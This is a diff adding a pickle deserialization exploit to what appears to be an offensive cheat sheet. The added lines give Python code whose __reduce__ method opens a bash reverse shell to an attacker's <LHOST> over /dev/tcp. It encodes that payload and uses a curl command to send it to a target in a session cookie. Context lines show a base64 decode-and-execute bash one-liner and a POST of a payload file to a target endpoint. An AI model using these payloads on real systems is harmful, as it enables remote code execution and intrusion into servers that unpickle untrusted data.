@@ -18,3 +18,18 @@ curl -X POST --data-binary @payload.b64 http://<TARGET>:<RPORT>/<import-endpoint
 bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}
 ```
 
+Python `pickle.loads()` on attacker-controlled data (a session cookie, a cache value) → RCE via `__reduce__`:
+```python
+import pickle, subprocess, base64
+
+class Exploit:
+    def __reduce__(self):
+        return (subprocess.Popen, (["bash", "-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"],))
+
+print(base64.b64encode(pickle.dumps(Exploit())).decode())
+# or hex-encode, depending on how the app decodes the cookie
+```
+```bash
+curl -H 'Cookie: session_data=<encoded-pickle>' http://<TARGET>
+```
+
